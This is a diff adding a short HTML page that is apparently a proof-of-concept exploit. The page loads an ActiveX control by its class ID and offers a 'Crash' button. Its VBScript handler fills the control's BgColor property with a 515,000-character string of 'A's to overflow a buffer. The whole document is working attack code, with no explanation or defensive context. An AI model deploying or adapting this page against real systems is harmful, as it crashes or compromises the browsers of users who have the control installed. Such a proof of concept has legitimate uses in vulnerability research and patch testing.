@@ -1,0 +1,12 @@
+&lt;html&gt;
+ &lt;object classid=&#039;clsid:CA06EE71-7348-44c4-9540-AAF0E6BD1515&#039; id=&#039;test&#039;&gt;&lt;/object&gt;
+  &lt;input language=VBScript onclick=buffero() type=button value=&quot;Crash&quot;&gt;
+  &lt;script language = &#039;vbscript&#039;&gt;
+ Sub buffero()
+
+  crash = String(515000, unescape(&quot;%41&quot;))
+  test.BgColor = crash
+ End Sub
+
+&lt;/script&gt;
+&lt;/html&gt;
